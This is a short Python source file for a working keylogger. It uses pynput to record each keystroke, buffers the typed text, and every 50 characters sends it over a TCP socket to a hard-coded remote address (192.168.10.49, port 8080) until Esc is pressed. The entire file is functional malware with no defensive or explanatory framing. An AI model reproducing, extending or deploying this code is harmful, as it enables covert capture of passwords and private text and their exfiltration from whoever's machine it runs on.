from pynput import keyboard
import socket

text = ""
ip_address = "192.168.10.49"
port_number = 8080

def send_text_over_socket(text_to_send):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((ip_address, port_number))
            s.sendall(text_to_send.encode())
        except Exception as e:
            print(f"Error occurred while sending data: {e}")

def on_press(key):
    global text

    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.backspace:
            text = text[:-1]
        else:
            text += str(key.char)
    except AttributeError:
        # Handle special keys like Key.enter, Key.backspace, etc.
        pass

    # You may want to limit the length of text to avoid sending too much data at once
    if len(text) >= 50:
        send_text_over_socket(text)
        text = ""

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start listening for key events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

